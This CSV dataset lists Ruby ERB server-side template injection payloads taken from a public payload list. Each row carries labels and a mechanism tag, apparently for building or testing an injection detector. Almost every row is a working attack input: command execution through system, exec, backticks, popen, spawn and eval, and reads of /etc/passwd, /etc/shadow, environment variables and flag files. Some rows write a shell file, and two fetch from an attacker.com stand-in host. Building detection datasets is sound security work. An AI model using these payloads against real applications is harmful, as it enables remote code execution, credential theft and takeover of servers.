payload,base_id,language,engine,label,mechanism,source_url
<%= 7*7 %>,<%=N*N%>,ruby,ERB,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= 7*'7' %>,<%=N*'S'%>,ruby,ERB,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""foo"" %>","<%=""S""%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""id"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= exec(""id"") %>","<%=exec(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{id} %>,<%=%x{id}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""id"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.read(""/etc/passwd"") %>","<%=io.read(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""/etc/passwd"").read %>","<%=file.open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""/etc/passwd"") %>","<%=file.read(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""/etc/passwd"",""r"").read %>","<%=file.open(""S"",""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""flag.txt"").read %>","<%=file.open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""flag.txt"") %>","<%=file.read(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.entries(""/"") %>","<%=dir.entries(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.glob(""*"") %>","<%=dir.glob(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Dir.pwd %>,<%=dir.pwd%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.chdir(""/tmp"") %>","<%=dir.chdir(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.binread(""/etc/passwd"") %>","<%=file.binread(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.readlines(""/etc/passwd"") %>","<%=file.readlines(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.foreach(""/etc/passwd"").read %>","<%=file.foreach(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.binread(""/etc/passwd"") %>","<%=io.binread(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.readlines(""/etc/passwd"") %>","<%=io.readlines(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.foreach(""/etc/passwd"").read %>","<%=io.foreach(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat /etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= exec(""cat /etc/passwd"") %>","<%=exec(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat /etc/passwd` %>,<%=`cat/etc/passwd`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat /etc/passwd} %>,<%=%x{cat/etc/passwd}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""cat /etc/passwd"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""whoami"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `whoami` %>,<%=`whoami`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{whoami} %>,<%=%x{whoami}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""whoami"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""ls -la"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ls -la` %>,<%=`ls-la`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{ls -la} %>,<%=%x{ls-la}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""ls -la"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""uname -a"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `uname -a` %>,<%=`uname-a`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{uname -a} %>,<%=%x{uname-a}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""pwd"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""env"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV %>,<%=env%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.to_h %>,<%=env.to_h%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""PATH""] %>","<%=env[""S""]%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""HOME""] %>","<%=env[""S""]%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""USER""] %>","<%=env[""S""]%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.keys %>,<%=env.keys%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.values %>,<%=env.values%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= RUBY_VERSION %>,<%=ruby_version%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= RUBY_PLATFORM %>,<%=ruby_platform%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __FILE__ %>,<%=__file__%>,ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __LINE__ %>,<%=__line__%>,ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __dir__ %>,<%=__dir__%>,ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self %>,<%=self%>,ruby,ERB,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.class %>,<%=self.class%>,ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.methods %>,<%=self.methods%>,ruby,ERB,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.instance_variables %>,<%=self.instance_variables%>,ruby,ERB,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ObjectSpace.each_object(Class).to_a %>,<%=objectspace.each_object(class).to_a%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel %>,<%=kernel%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel.methods %>,<%=kernel.methods%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.system(""id"") %>","<%=kernel.system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.exec(""id"") %>","<%=kernel.exec(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.`(""id"") %>","<%=kernel.`(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.spawn(""id"") %>","<%=kernel.spawn(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.open(""|id"").read %>","<%=kernel.open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.eval(""system('id')"") %>","<%=kernel.eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""system('id')"") %>","<%=eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""`id`"") %>","<%=eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""File.read('/etc/passwd')"") %>","<%=eval(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""IO.popen('id').read"") %>","<%=eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.eval(""IO.popen('id').read"") %>","<%=kernel.eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:system).call(""id"") %>","<%=method(:system).call(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:exec).call(""id"") %>","<%=method(:exec).call(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:eval).call(""system('id')"") %>","<%=method(:eval).call(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:system,""id"") %>","<%=send(:system,""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:exec,""id"") %>","<%=send(:exec,""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:eval,""system('id')"") %>","<%=send(:eval,""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(""`"",""id"") %>","<%=send(""S"",""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= public_send(:system,""id"") %>","<%=public_send(:system,""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= public_send(:eval,""system('id')"") %>","<%=public_send(:eval,""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= __send__(:system,""id"") %>","<%=__send__(:system,""S"")%>",ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= __send__(:eval,""system('id')"") %>","<%=__send__(:eval,""S"")%>",ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture2(""id"") %>","<%=openN.captureN(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture2e(""id"") %>","<%=openN.captureNe(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture3(""id"") %>","<%=openN.captureN(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.popen3(""id"") %>","<%=openN.popenN(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Gem::GemRunner.new.run(%w(install a)) %>,<%=gem::gemrunner.new.run(%w(installa))%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture2(""id"") %>","<%=require'S';openN.captureN(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture2e(""id"") %>","<%=require'S';openN.captureNe(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture3(""id"") %>","<%=require'S';openN.captureN(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= require 'open-uri'; open('http://attacker.com').read %>,<%=require'S';open('S').read%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= require 'net/http'; Net::HTTP.get(URI('http://attacker.com')) %>,<%=require'S';net::http.get(uri('S'))%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat flag.txt"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat flag.txt` %>,<%=`catflag.txt`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat flag.txt} %>,<%=%x{catflag.txt}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""cat flag.txt"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""ps aux"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ps aux` %>,<%=`psaux`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""netstat -an"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ifconfig` %>,<%=`ifconfig`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat /etc/shadow"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat /etc/shadow` %>,<%=`cat/etc/shadow`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""/etc/shadow"") %>","<%=file.read(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|id"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|cat /etc/passwd"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|whoami"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|ls -la"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|uname -a"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|pwd"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|env"").read %>","<%=open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x[id] %>,<%=%x[id]%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x|id| %>,<%=%x|id|%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x(id) %>,<%=%x(id)%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x<id> %>,<%=%x<id>%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel.%x(id) %>,<%=kernel.%x(id)%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Process.spawn(""id"") %>","<%=process.spawn(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Process.exec(""id"") %>","<%=process.exec(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Process.daemon %>,<%=process.daemon%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= spawn(""id"") %>","<%=spawn(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= fork{system(""id"")} %>","<%=fork{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.write(""shell.rb"",""system('id')"") %>","<%=io.write(""S"",""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.write(""shell.rb"",""system('id')"") %>","<%=file.write(""S"",""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""shell.rb"",""w"").write(""system('id')"") %>","<%=file.open(""S"",""S"").write(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.binwrite(""shell.rb"",""system('id')"") %>","<%=file.binwrite(""S"",""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""system('id')"".instance_eval %>","<%=""S"".instance_eval%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""File.read('/etc/passwd')"".instance_eval %>","<%=""S"".instance_eval%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
